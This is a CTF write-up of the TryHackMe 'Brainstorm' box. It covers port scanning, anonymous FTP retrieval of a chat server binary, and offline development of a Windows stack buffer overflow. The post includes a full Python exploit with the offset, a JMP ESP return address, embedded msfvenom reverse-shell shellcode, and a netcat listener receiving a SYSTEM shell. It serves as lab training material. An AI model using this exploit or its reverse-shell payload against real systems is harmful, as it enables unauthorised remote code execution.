---
layout: post
title: "THM: Brainstorm"
image: ''
date:   2021-09-17 12:00:00
tags:
- red
- buffer-overflow
description: ''
categories:
- TryHackMe
- Red Team
published: true
comments: false
---

![intro](https://an00brektn.github.io/img/Pasted image 20210904173235.png)

## Intro
Brainstorm was one of the first buffer overflow boxes I managed to root on a CTF platform after learning the basics. It's not hard if you understand the process, but it's a good  I'll start by scanning the machine and find FTP open with anonymous login. I'll also find a chatserver running on port 9999, and a copy of that executable in the FTP. Then, after doing some offline exploit development, I'll have a working buffer overflow that I can then run against the remote machine to gain Administrator access.

## Recon
As per usual, we always check what ports are open with **nmap**:
```zsh
kali@kali:~/ctf/thm/brainstorm$ rustscan --ulimit 5000 10.10.87.201 -- -Pn -A -oN scans/initscan.txt

PORT     STATE SERVICE            REASON  VERSION
21/tcp   open  ftp                syn-ack Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|_  SYST: Windows_NT
3389/tcp open  ssl/ms-wbt-server? syn-ack
| rdp-ntlm-info: 
|   Target_Name: BRAINSTORM
|   NetBIOS_Domain_Name: BRAINSTORM
|   NetBIOS_Computer_Name: BRAINSTORM
|   DNS_Domain_Name: brainstorm
|   DNS_Computer_Name: brainstorm
|   Product_Version: 6.1.7601
|_  System_Time: 2021-09-04T20:39:21+00:00
| ssl-cert: Subject: commonName=brainstorm
| Issuer: commonName=brainstorm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2021-09-03T20:33:01
| Not valid after:  2022-03-05T20:33:01
| MD5:   3e4c 357d e2f8 d941 71ac b948 96d0 5fa1
| SHA-1: 0afb 3bcc a509 53f2 7b3c 513d 5c26 dc6a 2675 6da3
| -----BEGIN CERTIFICATE-----
| MIIC2DCCAcCgAwIBAgIQaSwKPLo0d5NN0gDif49sEzANBgkqhkiG9w0BAQUFADAV
| MRMwEQYDVQQDEwpicmFpbnN0b3JtMB4XDTIxMDkwMzIwMzMwMVoXDTIyMDMwNTIw
| MzMwMVowFTETMBEGA1UEAxMKYnJhaW5zdG9ybTCCASIwDQYJKoZIhvcNAQEBBQAD
| ggEPADCCAQoCggEBAMWRfOQngz7NkqfBCliLD/YIu+VpR2nYh48wa91UQw5X8qlM
| UhkhvmpjJ5NbMHhkZDx3bd8hBDRsGtMgRYQydHvenMIeyX4BmuITb/D+ils+VWCs
| /QlN5PweQOp1hARUx369PuzRd4gjJgUiRrdvU0hZzC6LkOMtu2R3AXW8jSgu3FkJ
| TGSLpPTpUEbCD2rkjoUwAHV09b7BpbwEZpyhHIbTGIN+/3zrBfCUR4KArn6oVJA5
| 0gXH8zQVohm0GMBBYGLrY2dlBw/OK2Fsah3EnLcSvGzpL6YswBDYlSHCDNNV1IUB
| 910onHLFGzvBsDqjI9Jl5iQGSUrTI3BuFHz5+mECAwEAAaMkMCIwEwYDVR0lBAww
| CgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IBAQBI8jYG
| BXspwSzSDSTuPJKlAz/xUFYLGLCk3AMNdDdQGi+PZaBuPBsOdPwk9th2cGXk5Zxg
| D3CMTLaEsk+xn8gGLSzXKCbY4j3Kx+EnzpLqV3oo97qdjGA+q96W5udcUBzdCvQK
| rfFcf2RjG8f965q/MMt1c4GX8+vmrLTeFZt4sczvo8JaaoGoqjoA+ycPvlBrUAqQ
| w8Nfmf8XebDCaHt0d60ZLOzSd/vG8Il7TOXeQD6nU4xXrbGeV060/qdy9sI3nOtu
| lxMbgfAxglHyspQmT4G0cFDk2U2ET0jdZSQkOLyC78fuHNeSO0xg7Xz3Ta45VCiB
| ntM2V65Mc6Uwfgd8
|_-----END CERTIFICATE-----
|_ssl-date: 2021-09-04T20:39:52+00:00; 0s from scanner time.
9999/tcp open  abyss?             syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     Welcome to Brainstorm chat (beta)
|     Please enter your username (max 20 characters): Write a message:
|   NULL: 
|     Welcome to Brainstorm chat (beta)
|_    Please enter your username (max 20 characters):
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.91%I=7%D=9/4%Time=6133D8DB%P=x86_64-pc-linux-gnu%r(NUL
SF:L,52,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\
SF:x20your\x20username\x20\(max\x2020\x20characters\):\x20")%r(GetRequest,
SF:63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x2
SF:0your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x20mess
SF:age:\x20")%r(HTTPOptions,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(b
SF:eta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20characters
SF:\):\x20Write\x20a\x20message:\x20")%r(FourOhFourRequest,63,"Welcome\x20
SF:to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20userna
SF:me\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(Ja
SF:vaRMI,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20en
SF:ter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x
SF:20message:\x20")%r(GenericLines,63,"Welcome\x20to\x20Brainstorm\x20chat
SF:\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20cha
SF:racters\):\x20Write\x20a\x20message:\x20")%r(RTSPRequest,63,"Welcome\x2
SF:0to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20usern
SF:ame\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(R
SF:PCCheck,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20
SF:enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a
SF:\x20message:\x20")%r(DNSVersionBindReqTCP,63,"Welcome\x20to\x20Brainsto
SF:rm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2
SF:020\x20characters\):\x20Write\x20a\x20message:\x20")%r(DNSStatusRequest
SF:TCP,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20ente
SF:r\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x20
SF:message:\x20")%r(Help,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta
SF:\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20characters\):
SF:\x20Write\x20a\x20message:\x20")%r(SSLSessionReq,63,"Welcome\x20to\x20B
SF:rainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\
SF:(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(TerminalS
SF:erverCookie,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease
SF:\x20enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\
SF:x20a\x20message:\x20");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
```
We find 3 open ports, one of which (9999), is running some mystery service.

### FTP
When FTP is open, it's always worth checking for Anonymous login, which we are able to use.
```zsh
kali@kali:~/ctf/thm/brainstorm$ ftp 10.10.87.201
Connected to 10.10.87.201.
220 Microsoft FTP Service
Name (10.10.87.201:kali): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-29-19  08:36PM       <DIR>          chatserver
226 Transfer complete.
```
We find a chatserver directory, containing a `chatserver.exe` and an `essfunc.dll`  (which I can only assume has to be used by the chatserver program).  I'm going to go ahead and download these on to my machine using `binary` in FTP.

### Port 9999 - Chatserver
Based on our FTP findings and the nmap scan, we can guess that the chatserver is probably running on port 9999. We can interact with the port using netcat and see what's up. *It is at this point I accidentally broke the machine so I had to redeploy, so the machine's ip will look different.*
```bash
kali@kali:~/ctf/thm/brainstorm$ nc -nv 10.10.214.97 9999
(UNKNOWN) [10.10.214.97] 9999 (?) open
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): An00bRektn
Write a message: Hello world!


Sat Sep 04 14:09:37 2021
An00bRektn said: Hello world!


Write a message:  
```

It just seems like a chatserver with no one to talk to ;-;. We can try to see if we can crash the program with an absurdly sized inputs. We find that we can't actually overflow the username input, but we can crash the program if we put too large of an input (I'll spare you the output since it's 2000+ A's).

## Exploit Developement
Rather than shoot blindly at the program, I'll see if I can exploit it locally on a Windows VM, and then execute it on the real thing, by analyzing the program using [Immunity Debugger](https://www.immunityinc.com/products/debugger/). When I do basic stack overflows, I like using the template scripts from [Tib3rius](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst). 

```python
#!/usr/bin/python3
import socket

ip = "MACHINE_IP" # Set to remote machine ip
port = 9999

prefix = ""
offset = 0 # byte offset here
overflow = "A" * offset # Optional, set A to \x90 
retn = "" # JMP ESP (don't forget to reverse if little endian!)
padding = "\x90" * 16
payload = "" # shell code
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("[+] Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("[+] Done!")
except:
  print("[-] Could not connect. Try checking if the program is running?")
```

I'm not going to explain how to do a buffer overflow for people who know nothing about it (maybe for a later post), but I'll link some people who can explain it at the bottom of this writeup.

The process I use:
1. Identify the part of the program we can overflow (FOUND!)
2. Use Immunity Debugger and Mona to find the offset
3. Find bad characters and the right module (using Mona)
4. Verify the exploit works locally and then test it against the real thing.

Assume for all of these steps I'm running the vulnerable executable through Immunity Debugger because providing all of those screenshots is a little excessive.

### Installing Mona
Mona is a great plugin for Immunity Debugger that you can use to automate some of the more cumbersome parts of exploit development. You can find the plugin [here](https://github.com/corelan/mona). To install, just drag and drop `mona.py` into the PyCommands folder where the Immunity Debugger files are.

### Finding the Offset
As of the writing of this article, the `pattern_create.rb` file many of us were used to using has now been moved to `/usr/bin/msf-pattern_create` in Kali Linux. I'll use this tool to generate a cyclic string that I can then use to locate the EIP.
```bash
kali@kali:~/ctf/thm/brainstorm$ msf-pattern_create -l 3000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad...<it long>
```

Before I stick it in my exploit script, I have to modify it so that I can first submit a username, then the buffer.

```python
#!/usr/bin/python3
import socket

ip = "10.10.69.5" # Set to remote machine ip
port = 9999

prefix = ""
offset = 0 # byte offset here
overflow = "" * offset # Optional, set A to \x90 
retn = "" # JMP ESP (don't forget to reverse if little endian!)
padding = ""#"\x90" * 16
payload = "" # shell code
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("[+] Sending username...")
  s.send(bytes("An00bRektn" + "\r\n", "latin-1"))
  s.recv(1024)
  print("[+] Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  s.recv(1024)
  print("[+] Done!")
except:
  print("[-] Could not connect. Try checking if the program is running?")
```

I'm going to put the generated pattern into the exploit and see what Immunity Debugger has to say about it.

![asdf](https://an00brektn.github.io/img/Pasted image 20210904163639.png)

As you can see, the pointers in the program are completely overwritten, meaning that the program has no idea where to point next. Using this data, we can use a plugin called Mona to show us the offset. Entering `!mona findmsp -distance 3000` will show us the following:

![asdf](https://an00brektn.github.io/img/Pasted image 20210904164043.png)

We find that the EIP is offset by 2012 bytes, which we can add to our exploit.

### Find Bad Characters
Right now, our exploit should look like this:
```python
#!/usr/bin/python3
import socket

ip = "10.10.69.5" # Set to remote machine ip
port = 9999

prefix = ""
offset = 2012 # byte offset here
overflow = "A" * offset # Optional, set A to \x90 
retn = "BBBB" # JMP ESP (don't forget to reverse if little endian!)
padding = ""#"\x90" * 16
payload = "" # shell code
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("[+] Sending username...")
  s.send(bytes("An00bRektn" + "\r\n", "latin-1"))
  s.recv(1024)
  print("[+] Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  s.recv(1024)
  print("[+] Done!")
except:
  print("[-] Could not connect. Try checking if the program is running?")
```

Sometimes, programs interpret specific characters to serve a specific function, so we cannot use these in our shell code. Before jumping to grabbing the JMP ESP instuction and inserting shellcode, we need to find these bad characters. I'll steal a list of hex characters from [here](https://github.com/cytopia/badchars) and stick it in my code after the `retn` variable.
I'm also going to ask `mona` to do the same using `!mona bytearray -cpb "\x00"`, so I can have `mona` check the bad characters for me. I'll run the exploit again, and check for what bad characters might be using `!mona -f C:\Share\bytearray.bin -a 00DCEEA8`

![jekyll annoying](https://an00brektn.github.io/Pasted image 20210904165201.png)

Here, we see that there are no bad characters, so all we have to do is find the right module and the correct instruction pointer.

### Getting the Rest
I see this module step skipped a lot in other tutorials and writeups because it isn't *that* important, but I still think it's worth the check. If a binary/executable is statically compiled, feel free to skip this. But, since our executable pull from a dll (and other programs could pull from multiple), we might want to double check exactly where in memory we can attack. I can look at the different libraries using `!mona modules`.

![asdf](https://an00brektn.github.io/img/Pasted image 20210904165754.png)

Here, we're looking for a module that has all memory protections set to false, which `essfunc.dll` does. Our next step is to find the JMP ESP pointer that we can use to point back to our shell code, so we can get a shell. We can list instructions that are in `essfunc.dll` using the following command: `!mona find -s "\xff\xe4" -m essfunc.dll` (FF E4 is the JMP ESP instruction in hex).

![asdf](https://an00brektn.github.io/img/Pasted image 20210904170130.png)

If we had bad characters, we'd want to find a pointer that did not contain a bad character. However, since that isn't a problem we can grab the first address `0x625014df`, and put it in our exploit. Since Windows is little endian (which is some CS stuff that's outside of the scope of this writeup), we need to provide this in reverse order. Our exploit should now look like this:

```python
#!/usr/bin/python3
import socket

ip = "10.10.69.5" # Set to remote machine ip
port = 9999

prefix = ""
offset = 2012 # byte offset here
overflow = "A" * offset # Optional, set A to \x90 
retn = "\xdf\x14\x50\x62" # JMP ESP (don't forget to reverse if little endian!)
padding = ""#"\x90" * 16
payload = "" # shell code
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("[+] Sending username...")
  s.send(bytes("An00bRektn" + "\r\n", "latin-1"))
  s.recv(1024)
  print("[+] Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  s.recv(1024)
  print("[+] Done!")
except:
  print("[-] Could not connect. Try checking if the program is running?")
```

### Verifying it Works
There's one last step before we're ready to roll. We will use msfvenom to generate the shellcode like so:
```bash
kali@kali:~/ctf/thm/brainstorm$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.69.4 LPORT=443 EXITFUNC=thread -f c -a x86 -b "\x00"
```

Since I'm testing on a local VM, I'll have to regenerate this shell code when I go to do it on the real machine. Regardless, our final exploit should look similar to this:
```python
#!/usr/bin/python3
import socket

ip = "10.10.69.5" # Set to remote machine ip
port = 9999

prefix = ""
offset = 2012 # byte offset here
overflow = "A" * offset # Optional, set A to \x90 
retn = "\xdf\x14\x50\x62" # JMP ESP (don't forget to reverse if little endian!)
padding = "\x90" * 16
payload = ("\xd9\xc5\xbe\xbf\x9b\x73\x55\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x52\x83\xc7\x04\x31\x77\x13\x03\xc8\x88\x91\xa0\xca\x47\xd7"
"\x4b\x32\x98\xb8\xc2\xd7\xa9\xf8\xb1\x9c\x9a\xc8\xb2\xf0\x16"
"\xa2\x97\xe0\xad\xc6\x3f\x07\x05\x6c\x66\x26\x96\xdd\x5a\x29"
"\x14\x1c\x8f\x89\x25\xef\xc2\xc8\x62\x12\x2e\x98\x3b\x58\x9d"
"\x0c\x4f\x14\x1e\xa7\x03\xb8\x26\x54\xd3\xbb\x07\xcb\x6f\xe2"
"\x87\xea\xbc\x9e\x81\xf4\xa1\x9b\x58\x8f\x12\x57\x5b\x59\x6b"
"\x98\xf0\xa4\x43\x6b\x08\xe1\x64\x94\x7f\x1b\x97\x29\x78\xd8"
"\xe5\xf5\x0d\xfa\x4e\x7d\xb5\x26\x6e\x52\x20\xad\x7c\x1f\x26"
"\xe9\x60\x9e\xeb\x82\x9d\x2b\x0a\x44\x14\x6f\x29\x40\x7c\x2b"
"\x50\xd1\xd8\x9a\x6d\x01\x83\x43\xc8\x4a\x2e\x97\x61\x11\x27"
"\x54\x48\xa9\xb7\xf2\xdb\xda\x85\x5d\x70\x74\xa6\x16\x5e\x83"
"\xc9\x0c\x26\x1b\x34\xaf\x57\x32\xf3\xfb\x07\x2c\xd2\x83\xc3"
"\xac\xdb\x51\x43\xfc\x73\x0a\x24\xac\x33\xfa\xcc\xa6\xbb\x25"
"\xec\xc9\x11\x4e\x87\x30\xf2\x7b\x52\x7f\x06\x14\x60\x7f\x07"
"\x5f\xed\x99\x6d\x8f\xb8\x32\x1a\x36\xe1\xc8\xbb\xb7\x3f\xb5"
"\xfc\x3c\xcc\x4a\xb2\xb4\xb9\x58\x23\x35\xf4\x02\xe2\x4a\x22"
"\x2a\x68\xd8\xa9\xaa\xe7\xc1\x65\xfd\xa0\x34\x7c\x6b\x5d\x6e"
"\xd6\x89\x9c\xf6\x11\x09\x7b\xcb\x9c\x90\x0e\x77\xbb\x82\xd6"
"\x78\x87\xf6\x86\x2e\x51\xa0\x60\x99\x13\x1a\x3b\x76\xfa\xca"
"\xba\xb4\x3d\x8c\xc2\x90\xcb\x70\x72\x4d\x8a\x8f\xbb\x19\x1a"
"\xe8\xa1\xb9\xe5\x23\x62\xd9\x07\xe1\x9f\x72\x9e\x60\x22\x1f"
"\x21\x5f\x61\x26\xa2\x55\x1a\xdd\xba\x1c\x1f\x99\x7c\xcd\x6d"
"\xb2\xe8\xf1\xc2\xb3\x38") # shell code
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("[+] Sending username...")
  s.send(bytes("An00bRektn" + "\r\n", "latin-1"))
  s.recv(1024)
  print("[+] Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  s.recv(1024)
  print("[+] Done!")
except:
  print("[-] Could not connect. Try checking if the program is running?")
```

I'll start a listener on port 443 using netcat, run the `chatserver.exe` on my Windows VM as Administrator, and run the exploit.
```bash
kali@kali:~/ctf/thm/brainstorm$ python3 exploit.py
[+] Sending username...
[+] Sending evil buffer...
[+] Done!
```

```bash
kali@kali:~/ctf/thm/brainstorm$ sudo nc -lvnp 443
listening on [any] 443 ...
[FILLER]

C:\Users\Sybil Reisz\Desktop\vulnerable-programs\chatserver> whoami
SREISZ-PC\Administrator
```

*Note: I did turn off Windows Defender and the firewall for this. Anti-virus is a little annoying sometimes.*

## Shell as Administrator

All we have to do, after replacing the shell code, is point our exploit at the actual target.
```bash
kali@kali:~/ctf/thm/brainstorm$ sudo nc -lvnp 443 
listening on [any] 443 ...
connect to [10.13.16.34] from (UNKNOWN) [10.10.214.97] 49338
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>type C:\Users\drake\Desktop\root.txt
type C:\Users\drake\Desktop\root.txt
5b1001de************************
```